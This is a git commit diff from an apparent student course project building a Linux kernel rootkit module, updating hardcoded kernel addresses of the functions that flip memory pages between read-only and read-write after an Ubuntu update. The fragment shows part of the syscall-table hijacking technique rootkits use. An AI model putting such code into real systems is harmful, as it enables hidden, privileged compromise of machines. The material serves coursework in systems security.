fbefc5749c67e1aa7b17b5cc80086a91a3408f7c
yueyang0115 <yy258@vcm-19787.vm.duke.edu>
2021-04-05 22:27:08 -0400

    due to ubuntu system update, change address of pointer pages_rw and pages_ro

--- Proj5_Rootkit/sneaky_mod.c
+++ Proj5_Rootkit/sneaky_mod.c
@@ -32,9 +32,9 @@ MODULE_PARM_DESC(pid, "sneaky_pid");
 //permissions for the given address (page) to read-only or read-write.
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
-//      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page * page, int numpages) = (void *)0xffffffff81073190;
-void (*pages_ro)(struct page * page, int numpages) = (void *)0xffffffff81073110;
+//      e.g.  /boot/System.map-4.4.0-206-generic
+void (*pages_rw)(struct page * page, int numpages) = (void *)0xffffffff81073230;
+void (*pages_ro)(struct page * page, int numpages) = (void *)0xffffffff810731b0;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
